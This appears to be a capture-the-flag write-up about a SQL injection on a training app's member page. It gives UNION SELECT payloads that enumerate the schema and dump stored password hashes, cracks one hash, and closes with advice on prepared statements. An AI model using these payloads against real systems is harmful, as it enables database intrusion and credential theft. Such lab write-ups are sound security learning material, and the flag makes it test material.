# SQL Injection - Members

`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

---

## Description

go to `/?page=member`

submit :
- `1 AND 1=2 UNION SELECT column_name , 1 FROM information_schema.columns`
- `1 AND 1=2 UNION SELECT table_name , 1 FROM information_schema.columns`
- `1 AND 1=2 UNION SELECT table_schema, 1 FROM information_schema.tables`

then \
`1 AND 1=2 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users`

"Decrypt this password -> then lower all the char. Sh256 on it and it's good !"

password => 5ff9d0165b4f92b14994e5c685cdce28 => FortyTwo

FortyTwo = fortytwo 
fortytwo => sh256 => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5

---

## How to prevent it ?

In the case of a php back-end, use PDO :
- The query will be sanitized with the `prepare` statement
- It will then be executed with the `execute` statement once the risk of an undesired effect is avoided

Here is a more detailed explanation found on StackOverflow regarding the `prepare` and `execute` commands :

>The SQL statement you pass to prepare is parsed and compiled by the database server. By specifying parameters (either a ? or a named parameter like :name in the example above) you tell the database engine where you want to filter on. Then when you call execute, the prepared statement is combined with the parameter values you specify.

>The important thing here is that the parameter values are combined with the compiled statement, not an SQL string. SQL injection works by tricking the script into including malicious strings when it creates SQL to send to the database. So by sending the actual SQL separately from the parameters, you limit the risk of ending up with something you didn't intend."